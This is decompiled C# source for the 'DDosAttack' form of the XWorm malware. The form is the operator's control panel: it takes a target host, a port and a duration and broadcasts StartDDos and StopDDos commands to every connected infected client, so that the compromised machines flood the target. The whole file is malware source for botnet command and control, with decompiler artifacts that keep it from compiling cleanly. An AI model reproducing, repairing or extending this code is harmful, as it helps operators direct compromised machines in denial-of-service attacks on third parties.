using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;
using XWorm.My.Resources;

namespace XWorm
{
	// Token: 0x0200000E RID: 14
	[DesignerGenerated]
	public partial class DDosAttack : Form
	{
		// Token: 0x06000095 RID: 149 RVA: 0x00005B93 File Offset: 0x00003D93
		public DDosAttack()
		{
			base.FormClosing += this.DDosAttack_FormClosing;
			this.InitializeComponent();
		}

		// Token: 0x17000042 RID: 66
		// (get) Token: 0x06000098 RID: 152 RVA: 0x00006CFA File Offset: 0x00004EFA
		// (set) Token: 0x06000099 RID: 153 RVA: 0x00006D04 File Offset: 0x00004F04
		private virtual Label label4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000043 RID: 67
		// (get) Token: 0x0600009A RID: 154 RVA: 0x00006D0D File Offset: 0x00004F0D
		// (set) Token: 0x0600009B RID: 155 RVA: 0x00006D17 File Offset: 0x00004F17
		internal virtual StatusStrip StatusStrip1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000044 RID: 68
		// (get) Token: 0x0600009C RID: 156 RVA: 0x00006D20 File Offset: 0x00004F20
		// (set) Token: 0x0600009D RID: 157 RVA: 0x00006D2A File Offset: 0x00004F2A
		internal virtual ToolStripStatusLabel ToolStripStatusLabel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000045 RID: 69
		// (get) Token: 0x0600009E RID: 158 RVA: 0x00006D33 File Offset: 0x00004F33
		// (set) Token: 0x0600009F RID: 159 RVA: 0x00006D40 File Offset: 0x00004F40
		internal virtual System.Windows.Forms.Timer Timer1
		{
			[CompilerGenerated]
			get
			{
				return this._Timer1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				System.Windows.Forms.Timer timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer1 = value;
				timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x17000046 RID: 70
		// (get) Token: 0x060000A0 RID: 160 RVA: 0x00006D83 File Offset: 0x00004F83
		// (set) Token: 0x060000A1 RID: 161 RVA: 0x00006D8D File Offset: 0x00004F8D
		internal virtual ToolStripStatusLabel ToolStripStatusLabel2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000047 RID: 71
		// (get) Token: 0x060000A2 RID: 162 RVA: 0x00006D96 File Offset: 0x00004F96
		// (set) Token: 0x060000A3 RID: 163 RVA: 0x00006DA0 File Offset: 0x00004FA0
		internal virtual System.Windows.Forms.Timer Timer2
		{
			[CompilerGenerated]
			get
			{
				return this._Timer2;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer2_Tick);
				System.Windows.Forms.Timer timer = this._Timer2;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer2 = value;
				timer = this._Timer2;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x17000048 RID: 72
		// (get) Token: 0x060000A4 RID: 164 RVA: 0x00006DE3 File Offset: 0x00004FE3
		// (set) Token: 0x060000A5 RID: 165 RVA: 0x00006DED File Offset: 0x00004FED
		internal virtual Guna2GroupBox Guna2GroupBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000049 RID: 73
		// (get) Token: 0x060000A6 RID: 166 RVA: 0x00006DF6 File Offset: 0x00004FF6
		// (set) Token: 0x060000A7 RID: 167 RVA: 0x00006E00 File Offset: 0x00005000
		private virtual Label Label5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700004A RID: 74
		// (get) Token: 0x060000A8 RID: 168 RVA: 0x00006E09 File Offset: 0x00005009
		// (set) Token: 0x060000A9 RID: 169 RVA: 0x00006E13 File Offset: 0x00005013
		private virtual Label Label6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700004B RID: 75
		// (get) Token: 0x060000AA RID: 170 RVA: 0x00006E1C File Offset: 0x0000501C
		// (set) Token: 0x060000AB RID: 171 RVA: 0x00006E26 File Offset: 0x00005026
		internal virtual Guna2TextBox txtPort { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700004C RID: 76
		// (get) Token: 0x060000AC RID: 172 RVA: 0x00006E2F File Offset: 0x0000502F
		// (set) Token: 0x060000AD RID: 173 RVA: 0x00006E39 File Offset: 0x00005039
		internal virtual Guna2TextBox txtHost { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700004D RID: 77
		// (get) Token: 0x060000AE RID: 174 RVA: 0x00006E42 File Offset: 0x00005042
		// (set) Token: 0x060000AF RID: 175 RVA: 0x00006E4C File Offset: 0x0000504C
		internal virtual Guna2GroupBox Guna2GroupBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700004E RID: 78
		// (get) Token: 0x060000B0 RID: 176 RVA: 0x00006E55 File Offset: 0x00005055
		// (set) Token: 0x060000B1 RID: 177 RVA: 0x00006E5F File Offset: 0x0000505F
		private virtual Label Label7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700004F RID: 79
		// (get) Token: 0x060000B2 RID: 178 RVA: 0x00006E68 File Offset: 0x00005068
		// (set) Token: 0x060000B3 RID: 179 RVA: 0x00006E72 File Offset: 0x00005072
		internal virtual Guna2TextBox txtTimeout { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000050 RID: 80
		// (get) Token: 0x060000B4 RID: 180 RVA: 0x00006E7B File Offset: 0x0000507B
		// (set) Token: 0x060000B5 RID: 181 RVA: 0x00006E85 File Offset: 0x00005085
		internal virtual Guna2GroupBox Guna2GroupBox3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000051 RID: 81
		// (get) Token: 0x060000B6 RID: 182 RVA: 0x00006E8E File Offset: 0x0000508E
		// (set) Token: 0x060000B7 RID: 183 RVA: 0x00006E98 File Offset: 0x00005098
		internal virtual Guna2GradientButton Guna2GradientButton3
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2GradientButton3;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2GradientButton3_Click);
				Guna2GradientButton guna2GradientButton = this._Guna2GradientButton3;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click -= value2;
				}
				this._Guna2GradientButton3 = value;
				guna2GradientButton = this._Guna2GradientButton3;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click += value2;
				}
			}
		}

		// Token: 0x17000052 RID: 82
		// (get) Token: 0x060000B8 RID: 184 RVA: 0x00006EDB File Offset: 0x000050DB
		// (set) Token: 0x060000B9 RID: 185 RVA: 0x00006EE8 File Offset: 0x000050E8
		internal virtual Guna2GradientButton Guna2GradientButton2
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2GradientButton2;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2GradientButton2_Click);
				Guna2GradientButton guna2GradientButton = this._Guna2GradientButton2;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click -= value2;
				}
				this._Guna2GradientButton2 = value;
				guna2GradientButton = this._Guna2GradientButton2;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click += value2;
				}
			}
		}

		// Token: 0x060000BA RID: 186 RVA: 0x00006F2C File Offset: 0x0000512C
		public static string IsValid(string Address)
		{
			string result;
			try
			{
				result = new Uri(Address).DnsSafeHost;
			}
			catch (Exception ex)
			{
				result = Address;
			}
			return result;
		}

		// Token: 0x060000BB RID: 187 RVA: 0x00006F6C File Offset: 0x0000516C
		private void DDosAttack_FormClosing(object sender, FormClosingEventArgs e)
		{
			byte[] state = Helper.SB("StopDDos");
			try
			{
				foreach (Client $VB$NonLocal_ in DDosAttack.Clients)
				{
					DDosAttack._Closure$__R77-0 CS$<>8__locals1 = new DDosAttack._Closure$__R77-0(CS$<>8__locals1);
					CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
					}, state);
				}
			}
			finally
			{
				List<Client>.Enumerator enumerator;
				((IDisposable)enumerator).Dispose();
			}
			DDosAttack.Clients.Clear();
			base.Hide();
			base.Parent = null;
			e.Cancel = true;
		}

		// Token: 0x060000BC RID: 188 RVA: 0x0000700C File Offset: 0x0000520C
		private void Timer1_Tick(object sender, EventArgs e)
		{
			this.ToolStripStatusLabel1.Text = string.Format("Timeout :{0}", this.timespan.Subtract(TimeSpan.FromSeconds((double)this.stopwatch.Elapsed.Seconds)));
			bool flag = this.timespan < this.stopwatch.Elapsed;
			if (flag)
			{
				this.Guna2GradientButton2.Enabled = true;
				this.Guna2GradientButton3.Enabled = false;
				this.Timer1.Stop();
			}
		}

		// Token: 0x060000BD RID: 189 RVA: 0x0000709C File Offset: 0x0000529C
		private void Timer2_Tick(object sender, EventArgs e)
		{
			try
			{
				try
				{
					foreach (Client client in DDosAttack.Clients.ToList<Client>())
					{
						bool flag = !client.IsConnected;
						if (flag)
						{
							try
							{
								DDosAttack.Clients.Remove(client);
								this.ToolStripStatusLabel2.Text = "Clients [" + Conversions.ToString(DDosAttack.Clients.Count) + "]";
							}
							catch (Exception ex)
							{
							}
						}
					}
				}
				finally
				{
					List<Client>.Enumerator enumerator;
					((IDisposable)enumerator).Dispose();
				}
			}
			catch (Exception ex2)
			{
				Debug.WriteLine(ex2.Message);
			}
		}

		// Token: 0x060000BE RID: 190 RVA: 0x00007184 File Offset: 0x00005384
		private void Guna2GradientButton2_Click(object sender, EventArgs e)
		{
			bool flag = DDosAttack.Clients.Count > 0;
			if (flag)
			{
				bool flag2 = string.IsNullOrWhiteSpace(this.txtHost.Text) || string.IsNullOrWhiteSpace(this.txtPort.Text) || string.IsNullOrWhiteSpace(this.txtTimeout.Text);
				if (!flag2)
				{
					this.txtHost.Text = DDosAttack.IsValid(this.txtHost.Text);
					this.Guna2GradientButton2.Enabled = false;
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"StartDDos",
						SettingsHelper.SPL,
						this.txtHost.Text,
						":",
						this.txtPort.Text,
						":",
						this.txtTimeout.Text
					}));
					try
					{
						foreach (Client $VB$NonLocal_ in DDosAttack.Clients)
						{
							DDosAttack._Closure$__R80-2 CS$<>8__locals1 = new DDosAttack._Closure$__R80-2(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						List<Client>.Enumerator enumerator;
						((IDisposable)enumerator).Dispose();
					}
					this.Guna2GradientButton3.Enabled = true;
					this.timespan = TimeSpan.FromSeconds((double)(checked(Convert.ToInt32(this.txtTimeout.Text) * 60)));
					this.stopwatch = new Stopwatch();
					this.stopwatch.Start();
					this.Timer1.Start();
				}
			}
		}

		// Token: 0x060000BF RID: 191 RVA: 0x00007328 File Offset: 0x00005528
		private void Guna2GradientButton3_Click(object sender, EventArgs e)
		{
			byte[] state = Helper.SB("StopDDos");
			try
			{
				foreach (Client $VB$NonLocal_ in DDosAttack.Clients)
				{
					DDosAttack._Closure$__R81-4 CS$<>8__locals1 = new DDosAttack._Closure$__R81-4(CS$<>8__locals1);
					CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
					}, state);
				}
			}
			finally
			{
				List<Client>.Enumerator enumerator;
				((IDisposable)enumerator).Dispose();
			}
			this.Guna2GradientButton2.Enabled = true;
			this.Guna2GradientButton3.Enabled = false;
			this.Timer1.Stop();
		}

		// Token: 0x04000047 RID: 71
		private TimeSpan timespan;

		// Token: 0x04000048 RID: 72
		private Stopwatch stopwatch;

		// Token: 0x04000049 RID: 73
		public static List<Client> Clients = new List<Client>();
	}
}
